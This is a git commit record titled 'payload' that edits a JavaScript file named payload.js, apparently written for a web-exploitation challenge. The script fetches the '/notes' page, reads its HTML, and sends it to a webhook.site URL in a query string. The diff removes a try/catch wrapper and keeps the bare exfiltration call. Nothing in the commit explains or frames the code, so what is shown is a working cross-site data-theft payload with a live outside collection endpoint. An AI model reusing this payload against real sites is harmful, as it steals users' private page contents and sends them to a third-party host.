642ffb4342a1e8e1a090d991ce06a7436781df8b
Axl <bryannicholas7@gmail.com>
2025-06-20 23:18:45 +0700

    payload

--- payload.js
+++ payload.js
@@ -1,7 +1,4 @@
 const html_steal = await fetch('/notes')
 const html = await html_steal.text();
-try{
-    fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?data='+ html);}
-catch(e){
-    fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?data=Error: ' + e);
-}
+fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?data='+ html);
+
